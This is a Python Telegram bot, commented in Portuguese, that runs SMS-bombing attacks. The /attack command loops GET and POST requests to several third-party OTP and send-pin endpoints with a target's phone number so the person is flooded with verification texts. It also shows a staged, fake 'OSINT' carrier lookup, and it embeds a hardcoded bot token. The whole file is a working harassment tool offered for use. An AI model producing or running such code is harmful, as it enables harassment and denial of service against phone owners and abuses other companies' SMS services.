import telebot
import requests
import threading
import time

# --- CONFIGURAÇÕES ---
TOKEN = "8678290317:AAHrFP3IXWtreQhumMgAn9642HcTPTof8tI"
bot = telebot.TeleBot(TOKEN)

# Lista de APIs Atualizada (Tentativa com endpoints mais abrangentes)
API_LIST = [
    "https://api.torob.com/a/phone/send-pin/?phone_number=",
    "https://api.snapp.taxi/api/api-passenger-oauth/v2/otp",
    "https://www.estadao.com.br/api/v1/otp/send/",
    "https://api.sms-bomb.com/api/send?phone=",
    "https://api.fastsms.io/send?number="
]

# Dicionário simplificado de operadoras por prefixo (Exemplo)
OPERADORAS = {
    "11": {"11": "Vivo", "15": "Claro", "17": "Tim", "19": "Oi"},
    "21": {"21": "Vivo", "24": "Claro", "27": "Tim", "28": "Oi"},
    # O bot usará uma lógica genérica caso o DDD não esteja mapeado
}

def get_operator(phone):
    # Remove caracteres não numéricos
    phone = "".join(filter(str.isdigit, phone))
    if len(phone) < 10:
        return "Desconhecida"
    
    ddd = phone[2:4] if phone.startswith("55") else phone[0:2]
    prefix = phone[4:6] if phone.startswith("55") else phone[2:4]
    
    # Tenta buscar no dicionário, se não achar, retorna baseado no prefixo comum
    try:
        return OPERADORAS.get(ddd, {}).get(prefix, "Operadora Brasileira")
    except:
        return "Operadora Brasileira"

def attack_loop(phone, count, chat_id):
    success = 0
    fail = 0
    
    for i in range(count):
        for url in API_LIST:
            try:
                # Tenta GET e POST para maximizar a chance de acerto
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
                res = requests.get(f"{url}{phone}", timeout=5, headers=headers)
                if res.status_code == 200:
                    success += 1
                else:
                    res_post = requests.post(url, data={"phone": phone, "cellphone": phone, "number": phone}, timeout=5, headers=headers)
                    if res_post.status_code == 200:
                        success += 1
                    else:
                        fail += 1
            except:
                fail += 1
        time.sleep(0.5)
    
    bot.send_message(chat_id, f"✅ Ataque Finalizado!\n\nSucessos: {success}\nFalhas: {fail}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Bot de Stress SMS Ativo.\nUse: /attack [numero] [quantidade]\nExemplo: /attack 5511999999999 50")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    try:
        args = message.text.split()
        phone = args[1]
        count = int(args[2])
        
        # 1. Identificação de Operadora (OSINT)
        op = get_operator(phone)
        
        bot.reply_to(message, f"🔍 Consultando número {phone}...")
        time.sleep(1.5)
        bot.send_message(message.chat.id, f"🎯 Número Encontrado!\n📱 Operadora: {op}\n📍 Status: Ativo")
        time.sleep(1)
        
        bot.send_message(message.chat.id, f"🚀 Iniciando ataque de stress...\nQuantidade: {count} ciclos.")
        
        # 2. Execução do Ataque em Thread
        threading.Thread(target=attack_loop, args=(phone, count, message.chat.id)).start()
        
    except Exception as e:
        bot.reply_to(message, "❌ Erro! Use o formato: /attack 5511999999999 50")

print("Bot rodando com OSINT...")
bot.infinity_polling()
